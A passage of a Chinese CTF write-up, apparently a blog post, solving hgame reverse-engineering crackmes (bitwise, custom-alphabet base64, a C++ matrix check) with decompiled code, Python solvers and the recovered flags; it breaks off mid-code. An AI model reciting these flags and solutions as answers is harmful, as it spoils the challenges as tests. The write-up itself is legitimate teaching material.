class="hljs-number">55</span>, <span class="hljs-number">56</span>, <span class="hljs-number">57</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>]</span><br><span class="line"><span class="hljs-comment"># 字母表不多，逆运算难以进行所以采用遍历的方式进行计算</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= j &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">48</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">87</span></span><br><span class="line">        v24[<span class="hljs-number">2</span>*i]=j</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span> &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            v24[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-number">102</span> &gt;= v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span> &gt; <span class="hljs-number">96</span>:</span><br><span class="line">            v24[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v14[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:</span><br><span class="line">        v25[<span class="hljs-number">2</span> * i] = j</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">57</span> &gt;= j &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">48</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="hljs-number">87</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">102</span> &gt;= v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span> &gt; <span class="hljs-number">96</span>:</span><br><span class="line">            v25[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">87</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-number">57</span> &gt;= v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span> &gt; <span class="hljs-number">47</span>:</span><br><span class="line">            v25[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>] = v16[i] - <span class="hljs-number">16</span> * tmp + <span class="hljs-number">48</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># print(v24)</span></span><br><span class="line"><span class="hljs-comment"># print(v25)</span></span><br><span class="line">flag = <span class="hljs-string">'hgame{'</span>+<span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(v24[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) + <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(v25[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])+<span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出得到flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{0f233e63637982d266cbf41ecb1b0102}</span><br></pre></td></tr></tbody></table></figure><p>到虚拟机上验证一下，发现结果正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" alt="bitwise_operation2"></p><h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 len; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> len0; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> flag; <span class="hljs-comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"please input you flag:\n"</span>);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;flag, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>ui64);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;flag, <span class="hljs-number">100</span>i64);</span><br><span class="line">  len = <span class="hljs-built_in">strlen</span>(&amp;flag);                          <span class="hljs-comment">// 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）</span></span><br><span class="line">  len0 = len;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !len )                                   <span class="hljs-comment">// 若输入空字符串，直接报错</span></span><br><span class="line">  {</span><br><span class="line">LABEL_6:</span><br><span class="line">    v7 = <span class="hljs-string">"try again\n"</span>;</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_7;</span><br><span class="line">  }</span><br><span class="line">  v5 = <span class="hljs-built_in">sub_140002000</span>(len);                      </span><br><span class="line">  v6 = <span class="hljs-built_in">malloc</span>(v5);<span class="hljs-comment">// 分配空间</span></span><br><span class="line">  <span class="hljs-built_in">cryption</span>(v6, (__int64)&amp;flag, len0);           <span class="hljs-comment">// 加密算法部分</span></span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strncmp</span>(v6, <span class="hljs-string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, <span class="hljs-number">0x64</span>ui64) )<span class="hljs-comment">// 相同则返回0，跳过if，输出get it，flag正确</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v6 )</span><br><span class="line">      <span class="hljs-built_in">free</span>(v6);</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  v7 = <span class="hljs-string">"get it\n"</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="hljs-built_in">puts</span>(v7);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//最重要的cryption加密函数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 __fastcall <span class="hljs-title">sub_140001EB0</span><span class="hljs-params">(_BYTE *a1, __int64 a2, <span class="hljs-keyword">int</span> a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// er10</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rbx</span></span><br><span class="line">  _BYTE *v6; <span class="hljs-comment">// rdi</span></span><br><span class="line">  _BYTE *v7; <span class="hljs-comment">// r9</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v8; <span class="hljs-comment">// r11</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-comment">// a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度</span></span><br><span class="line">  v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  v4 = a3 - <span class="hljs-number">2</span>;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = a2 + <span class="hljs-number">1</span>;</span><br><span class="line">    v9 = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">unsigned</span> __int64)(v4 - <span class="hljs-number">1</span>) * (<span class="hljs-keyword">unsigned</span> __int128)<span class="hljs-number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;</span><br><span class="line">    v3 = <span class="hljs-number">3</span> * v9;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v10 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">1</span>);</span><br><span class="line">      v8 += <span class="hljs-number">3</span>i64;</span><br><span class="line">      *v7 = alphabet[v10 &gt;&gt; <span class="hljs-number">2</span>];</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">3</span>) &gt;&gt; <span class="hljs-number">4</span>) | <span class="hljs-number">16</span>i64 * (*(_BYTE *)(v8 - <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">      v7[<span class="hljs-number">2</span>] = alphabet[<span class="hljs-number">4</span>i64 * (*(_BYTE *)(v8 - <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xF</span>) | ((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v8 - <span class="hljs-number">2</span>) &gt;&gt; <span class="hljs-number">6</span>)];</span><br><span class="line">      v7[<span class="hljs-number">3</span>] = alphabet[*(_BYTE *)(v8 - <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3F</span>];</span><br><span class="line">      v7 += <span class="hljs-number">4</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v9 );</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v3 &lt; a3 )</span><br><span class="line">  {</span><br><span class="line">    *v7 = alphabet[(<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v3 + v5) &gt;&gt; <span class="hljs-number">2</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == a3 - <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v11 = <span class="hljs-number">61</span>;</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[<span class="hljs-number">16</span> * (*(_BYTE *)(v3 + v5) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = alphabet[((<span class="hljs-keyword">unsigned</span> __int64)*(<span class="hljs-keyword">unsigned</span> __int8 *)(v5 + v3 + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">4</span>) | <span class="hljs-number">16</span>i64 * (*(_BYTE *)(v3 + v5) &amp; <span class="hljs-number">3</span>)];</span><br><span class="line">      v11 = alphabet[<span class="hljs-number">4</span> * (*(_BYTE *)(v5 + v3 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xF</span>)];</span><br><span class="line">    }</span><br><span class="line">    v7[<span class="hljs-number">2</span>] = v11;</span><br><span class="line">    v7[<span class="hljs-number">3</span>] = <span class="hljs-number">61</span>;</span><br><span class="line">    v7 += <span class="hljs-number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  *v7 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> v7 - v6 + <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alphabet=<span class="hljs-string">'abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></tbody></table></figure><p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64de</span>(<span class="hljs-params">path_in, path_out</span>):</span></span><br><span class="line">    b64_str = <span class="hljs-built_in">open</span>(path_in).read()</span><br><span class="line">    charset = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    <span class="hljs-comment"># print(charset)</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b64_str:</span><br><span class="line">        <span class="hljs-keyword">if</span> i != <span class="hljs-string">'='</span>:</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                x = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(charset.index(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>)</span><br><span class="line">            <span class="hljs-keyword">except</span> ValueError:</span><br><span class="line">                <span class="hljs-built_in">print</span>(i)</span><br><span class="line">            bin_str.append(<span class="hljs-string">'{:0&gt;6}'</span>.<span class="hljs-built_in">format</span>(x))  <span class="hljs-comment"># 填充成6位</span></span><br><span class="line">            <span class="hljs-comment"># print(bin_str)</span></span><br><span class="line">    b64_bin = <span class="hljs-built_in">bytearray</span>()  <span class="hljs-comment"># 最后只能写入bytes</span></span><br><span class="line">    nums = <span class="hljs-built_in">len</span>(bin_str) // <span class="hljs-number">4</span></span><br><span class="line">    remain = <span class="hljs-built_in">len</span>(bin_str) % <span class="hljs-number">4</span></span><br><span class="line">    fore_part = bin_str[:<span class="hljs-number">4</span> * nums]  <span class="hljs-comment"># 四个一组截取</span></span><br><span class="line">    <span class="hljs-comment"># print(fore_part)</span></span><br><span class="line">    <span class="hljs-keyword">while</span> fore_part:</span><br><span class="line">        <span class="hljs-comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">        b64_tmp = <span class="hljs-string">''</span>.join(fore_part[:<span class="hljs-number">4</span>])  <span class="hljs-comment"># 4*6/8</span></span><br><span class="line"></span><br><span class="line">        b64_tmp = [<span class="hljs-built_in">int</span>(b64_tmp[x: x + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]  <span class="hljs-comment"># 转换成10进制</span></span><br><span class="line">        <span class="hljs-comment"># print(b64_tmp)</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b64_tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">        fore_part = fore_part[<span class="hljs-number">4</span>:]  <span class="hljs-comment"># 向后移动四位</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="hljs-string">''</span>.join(bin_str[nums * <span class="hljs-number">4</span>:])</span><br><span class="line">        <span class="hljs-comment"># print(remain_part)</span></span><br><span class="line">        tmp = [<span class="hljs-built_in">int</span>(remain_part[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(remain - <span class="hljs-number">1</span>)]</span><br><span class="line">        <span class="hljs-comment"># print(tmp)</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">    <span class="hljs-comment"># print(b64_bin)</span></span><br><span class="line">    fd = <span class="hljs-built_in">open</span>(path_out, <span class="hljs-string">'wb'</span>)</span><br><span class="line">    fd.write(b64_bin)</span><br><span class="line">    fd.close()</span><br><span class="line">    </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    b64de(<span class="hljs-string">"./pic_en.txt"</span>, <span class="hljs-string">"./pic_de.txt"</span>)</span><br><span class="line">    </span><br></pre></td></tr></tbody></table></figure><p>输出的flag为：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{b45e6a_i5_50_eazy_6VVSQ}</span><br></pre></td></tr></tbody></table></figure><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">sub_140002AE0</span>((__int64)&amp;v13);                 <span class="hljs-comment">// 大概是string类的构造函数</span></span><br><span class="line"> <span class="hljs-built_in">sub_1400018D0</span>(std::cin, &amp;v13);                <span class="hljs-comment">// cin&gt;&gt;v13</span></span><br><span class="line"> v15 = <span class="hljs-string">"hgame{"</span>;</span><br><span class="line"> <span class="hljs-built_in">sub_140002B30</span>((__int64)&amp;v14);</span><br><span class="line"> <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">find_sub</span>(&amp;v13, v15, <span class="hljs-number">0</span>i64) || <span class="hljs-built_in">find_sub</span>(&amp;v13, <span class="hljs-string">"}"</span>, <span class="hljs-number">0</span>i64) != <span class="hljs-number">61</span> )<span class="hljs-comment">// 猜测输入字符串长度位62，格式位hgame{***}</span></span><br><span class="line"> {</span><br><span class="line">   v5 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"error"</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v5, sub_140002830);</span><br><span class="line">   <span class="hljs-built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">   <span class="hljs-built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">   result = <span class="hljs-number">0</span>i64;</span><br><span class="line"> }</span><br><span class="line"> <span class="hljs-keyword">else</span></span><br><span class="line"> {</span><br><span class="line">   <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">6</span>i64; ; i = v11 + <span class="hljs-number">1</span> )             <span class="hljs-comment">// 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数</span></span><br><span class="line">   {</span><br><span class="line">     <span class="hljs-built_in">LOBYTE</span>(v0) = <span class="hljs-string">'_'</span>;</span><br><span class="line">     v11 = <span class="hljs-built_in">find</span>(&amp;v13, v0, i);</span><br><span class="line">     <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">-1</span> )</span><br><span class="line">       <span class="hljs-keyword">break</span>;</span><br><span class="line">     v16 = <span class="hljs-built_in">sub_1400043B0</span>(&amp;v13, &amp;v40, i, v11 - i);</span><br><span class="line">     v17 = v16;</span><br><span class="line">     v1 = <span class="hljs-built_in">sub_140003E80</span>(v16);</span><br><span class="line">     v18 = <span class="hljs-built_in">atoll</span>(v1);</span><br><span class="line">     <span class="hljs-built_in">sub_140004350</span>(&amp;v14, &amp;v18);</span><br><span class="line">     <span class="hljs-built_in">sub_140002FA0</span>(&amp;v40);</span><br><span class="line">   }</span><br><span class="line">   v19 = <span class="hljs-built_in">sub_1400043B0</span>(&amp;v13, &amp;v41, i, <span class="hljs-number">61</span> - i);</span><br><span class="line">   v20 = v19;</span><br><span class="line">   v2 = <span class="hljs-built_in">sub_140003E80</span>(v19);</span><br><span class="line">   v21 = <span class="hljs-built_in">atoll</span>(v2);                            <span class="hljs-comment">// 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字</span></span><br><span class="line">   <span class="hljs-built_in">sub_140004350</span>(&amp;v14, &amp;v21);</span><br><span class="line">   <span class="hljs-built_in">sub_140002FA0</span>(&amp;v41);</span><br><span class="line">   v31 = <span class="hljs-number">26727</span>i64;                             <span class="hljs-comment">// 根据下面的运算这里应该是两个矩阵</span></span><br><span class="line">   v32 = <span class="hljs-number">24941</span>i64;</span><br><span class="line">   v33 = <span class="hljs-number">101</span>i64;</span><br><span class="line">   v34 = <span class="hljs-number">29285</span>i64;</span><br><span class="line">   v35 = <span class="hljs-number">26995</span>i64;</span><br><span class="line">   v36 = <span class="hljs-number">29551</span>i64;</span><br><span class="line">   v37 = <span class="hljs-number">29551</span>i64;</span><br><span class="line">   v38 = <span class="hljs-number">25953</span>i64;</span><br><span class="line">   v39 = <span class="hljs-number">29561</span>i64;</span><br><span class="line">   v22 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v23 = <span class="hljs-number">0</span>i64;</span><br><span class="line">   v24 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v25 = <span class="hljs-number">0</span>i64;</span><br><span class="line">   v26 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v27 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v28 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v29 = <span class="hljs-number">2</span>i64;</span><br><span class="line">   v30 = <span class="hljs-number">2</span>i64;</span><br><span class="line">   <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>i64; j &lt; <span class="hljs-number">3</span>; ++j )                <span class="hljs-comment">// 三个for循环时矩阵运算，如果满足条件就直接输出正确</span></span><br><span class="line">   {</span><br><span class="line">     <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>i64; k &lt; <span class="hljs-number">3</span>; ++k )</span><br><span class="line">     {</span><br><span class="line">       v12 = <span class="hljs-number">0</span>i64;</span><br><span class="line">       <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; <span class="hljs-number">3</span>; ++l )</span><br><span class="line">         v12 += *(&amp;v22 + <span class="hljs-number">3</span> * l + k) * *(_QWORD *)<span class="hljs-built_in">sub_1400031E0</span>(&amp;v14, l + <span class="hljs-number">3</span> * j);</span><br><span class="line">       <span class="hljs-keyword">if</span> ( *(&amp;v31 + <span class="hljs-number">3</span> * j + k) != v12 )</span><br><span class="line">       {</span><br><span class="line">         v3 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"error"</span>);</span><br><span class="line">         std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, sub_140002830);</span><br><span class="line">         <span class="hljs-built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">         <span class="hljs-built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;</span><br><span class="line">       